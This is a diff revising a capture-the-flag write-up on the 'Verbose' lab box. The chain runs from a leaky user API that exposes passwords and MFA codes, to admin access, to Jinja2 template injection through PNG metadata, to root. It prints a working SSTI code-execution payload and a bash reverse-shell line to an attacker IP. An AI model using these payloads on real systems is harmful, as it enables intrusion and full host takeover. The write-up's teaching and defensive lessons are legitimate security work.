@@ -56,7 +56,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 *Nmap scan: SSH on 22 and HTTP on 80 with Werkzeug and Python identified*
 
-Two ports open: SSH on 22 and HTTP on 80. The HTTP banner identifies Werkzeug 3.1.5 running Python 3.12.3, and the page title redirects to `/login`. Let's check if SSH accepts password authentication.
+Two ports open. The HTTP banner identifies Werkzeug 3.1.5 running Python 3.12.3, and the page title redirects to `/login`. Let's check whether SSH accepts password authentication.
 
 ```
 ssh root@10.1.69.115
@@ -70,7 +70,7 @@ root@10.1.69.115: Permission denied (publickey).
 
 *SSH requires key-based authentication with no password login available*
 
-SSH requires key-based authentication, so we set that aside and focus on the web application.
+SSH requires a key, so we set it aside and focus on the web application.
 
 ## HTTP (Port 80)
 
@@ -80,17 +80,15 @@ We open Burp Suite and navigate to `http://10.1.69.115`. The application present
 
 *Verbose web application with Wappalyzer confirming Flask and Python*
 
-Wappalyzer confirms this is a Flask application running Python. We register an account and click through the application as a standard user to understand its functionality. When clicking the messages feature, the application displays a list of users available to message.
+Wappalyzer confirms this is a Flask application running Python. We register an account and click through the application as a standard user. The messages feature displays a list of users available to message.
 
 ![Messages user list](images/messages-users.png)
 
 *Messages feature displaying available users on the platform*
 
-Let's check what requests are being made behind the scenes in Burp Suite.
+## Access as admin
 
-## API Enumeration
-
-Clicking through the application fills up Burp's proxy history, and in there we notice a GET request to `/api/users/all` triggered by the messages page. The response returns far more information than a messages feature should need.
+Clicking through the application fills up Burp's proxy history, and in there is a GET request to `/api/users/all` triggered by the messages page. The response returns far more than a messages feature needs.
 
 ```
 HTTP/1.1 200 OK
@@ -107,17 +105,13 @@ Connection: close
 
 *Burp Suite: /api/users/all returning plaintext credentials for all users including admin*
 
-The API dumps the entire user table in plaintext: usernames, emails, passwords, roles, and an `mfa` field. We immediately spot the admin account with the password `YouWontGetThisPasswordYouNoobLOL123`. The `mfa` field is `null` for all users right now. Let's try logging in as admin.
-
-## Access as admin
-
-We log out and authenticate as `admin` with the leaked password. The application prompts us for an MFA code.
+The API dumps the entire user table in plaintext: usernames, emails, passwords, roles, and an `mfa` field that is `null` for everyone. The admin password is `YouWontGetThisPasswordYouNoobLOL123`, so we log out and authenticate as `admin`.
 
 ![MFA login prompt](images/mfa-prompt.png)
 
 *MFA prompt blocking admin login after credential entry*
 
-When we try to log in, the server generates an MFA code for the admin account. Since the `/api/users/all` endpoint exposes everything without restriction, we send the request to Burp Repeater and fire it again.
+The application prompts for an MFA code. Submitting the password is what makes the server generate one, and that code is stored in the same `mfa` field the API hands out without restriction, so we send the request to Burp Repeater and fire it again.
 
 ![Burp MFA code](images/burp-mfa-code.png)
 
@@ -129,15 +123,15 @@ The `mfa` field for admin is now populated. We enter the code and complete the l
 
 *Admin panel accessed with first flag retrieved*
 
-## SSTI
+## Shell as root (root.txt)
 
-With admin access, we explore the additional functionality available. The front page of the Admin Panel has a Site Branding section where we can upload a PNG file.
+The front page of the Admin Panel has a Site Branding section that accepts a PNG upload.
 
 ![Site branding upload](images/site-branding.png)
 
 *Admin panel Site Branding section with PNG file upload*
 
-We upload a test PNG and click the `Preview Current Logo` button. The preview page displays image metadata fields including `Copyright / Artist`. If the application is rendering metadata directly into the page, we can control what gets displayed by modifying the image metadata with exiftool.
+We upload a test PNG and click `Preview Current Logo`. The preview page displays image metadata fields including `Copyright / Artist`. If the application renders metadata into the page, we control what gets displayed by editing the metadata with exiftool.
 
 ```
 exiftool -Artist="0xB1rd" image.png
@@ -147,19 +141,19 @@ exiftool -Artist="0xB1rd" image.png
 
 *exiftool: Artist field set to 0xB1rd on test image*
 
-We upload the modified image and preview it. Our input is reflected on the page under the metadata field.
+We upload the modified image and preview it. Our input comes back on the page under the metadata field.
 
 ![Reflected metadata](images/metadata-reflected.png)
 
 *Reflected input: 0xB1rd rendered in the Copyright / Artist metadata field*
 
-With reflected input confirmed, we consider attack paths like Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI). Since we already have admin access on the web application, XSS does not move us forward. Our next objective is a foothold on the server itself, and SSTI can get us there. This is a Flask application, so the templating engine is almost certainly Jinja2. We start with a basic arithmetic test. If the page renders `49` instead of the literal string, SSTI is confirmed.
+Reflected input into a Flask page means the templating engine is almost certainly Jinja2, which makes Server-Side Template Injection the path worth testing. In an SSTI the application drops our input into the template before rendering it, so instead of being printed as text it gets evaluated as template code. Cross-Site Scripting would not move us forward here since we already hold admin on the application, and what we want is the server. We start with a basic arithmetic test.
 
 ```
 exiftool -Artist="{{7*7}}" image.png
 ```
 
-We upload the image and click `Preview Current Logo`. The metadata field displays `49`.
+We upload the image and click `Preview Current Logo`. The metadata field displays `49` rather than the literal string.
 
 ![SSTI confirmation](images/ssti-confirmed.png)
 
@@ -171,27 +165,25 @@ SSTI is confirmed. Now we escalate to remote code execution. Jinja2 does not exp
 exiftool -Artist="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" image.png
 ```
 
-We upload, preview, and the metadata field displays `uid=0(root) gid=0(root) groups=0(root)`. We have RCE as root.
+We upload, preview, and the metadata field displays `uid=0(root) gid=0(root) groups=0(root)`.
 
 ![RCE as root](images/ssti-rce.png)
 
 *RCE via SSTI: id command returning uid=0(root) gid=0(root) groups=0(root)*
 
-## Shell as root (root.txt)
-
-With confirmed RCE as root, we craft a reverse shell payload and embed it in the image metadata. We catch the shell with Penelope, which handles the shell upgrade automatically.
+With RCE as root we swap the command for a reverse shell payload and embed it in the image metadata.
 
 ```
 exiftool -Artist="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/10.200.65.100/1337 0>&1\"').read() }}" image.png
 ```
 
-Now we start our Penelope listener.
+We start our Penelope listener, which upgrades the TTY on its own once a shell lands.
 
 ```
 penelope -p 1337
 ```
 
-With the listener running, we upload the image and click `Preview Current Logo`. The web application hangs as the reverse shell connects, and Penelope catches the shell.
+We upload the image and click `Preview Current Logo`. The web application hangs as the reverse shell connects, and Penelope catches it.
 
 ![Penelope reverse shell](images/penelope-shell.png)
 
@@ -205,8 +197,8 @@ We confirm with `id` that we are root and grab the final flag from `/root/root.t
 
 ## Final Thoughts
 
-Every step in Verbose is an application logic failure rather than a memory safety bug. An API returns more than the page asks for, the MFA code lands in that same response a moment later, and a template engine renders metadata pulled straight out of an uploaded file. Image metadata as an SSTI entry point was new to me, and I got there by noticing that the `Copyright / Artist` field came back rendered instead of escaped.
+Image metadata as an SSTI entry point was new to me. I got there by noticing the `Copyright / Artist` field came back rendered instead of escaped, which is easy to walk past when you are looking at an upload feature for file type tricks instead. The MFA bypass was the other one I did not see coming, since the code turned up in an endpoint I had already read once and moved on from.
 
-The core issue is the `/api/users/all` endpoint returning sensitive data with no access controls. API endpoints should enforce role-based authorization, never return plaintext passwords, and never expose MFA codes in responses. On the SSTI side, user-controlled input passed into a template engine needs to be sanitized or rendered safely, and image metadata should be treated as untrusted input before being displayed on a page. The application also runs as root, so SSTI immediately granted full system access with no privilege escalation required. Web applications should always run under a least-privilege service account so that a template injection bug costs an attacker a low-privilege foothold instead of the whole host.
+The `/api/users/all` endpoint is the root of all of it. API endpoints need role-based authorization, and none of them should be returning stored passwords or a live MFA code. Input reaching a template engine has to be escaped, and image metadata counts as input. The application also ran as root, so template injection went straight to the host with no escalation step, which a least-privilege service account would have kept to a low-privilege foothold.
 
 — 0xB1rd
